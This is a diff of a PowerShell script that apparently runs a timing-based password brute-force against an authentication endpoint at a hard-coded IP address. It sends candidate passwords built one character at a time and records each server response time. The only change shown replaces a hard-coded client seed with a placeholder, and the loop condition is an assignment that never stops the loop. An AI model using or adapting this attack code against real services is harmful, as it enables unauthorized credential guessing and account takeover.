@@ -11,7 +11,7 @@ $stop = $false
 while ($stop = $true){
     foreach ($char in $list){
         $row = $dtable.NewRow()
-        $params = @{"Seed"="a722b91c792043a8a28d269cb782717a";"Password"="$found$char"} | ConvertTo-Json
+        $params = @{"Seed"="CLIENTID_GOES_HERE";"Password"="$found$char"} | ConvertTo-Json
         $headers = @{"Server"="iWalk-Server-v2"}
         $response = Invoke-RestMethod -uri "http://35.246.158.51:8070/auth/v1_1" -UserAgent "ed9ae2c0-9b15-4556-a393-23d500675d4b" -Method Post -Body $params -Headers $headers -ContentType "application/json"
         $row.Time = $response.Time 
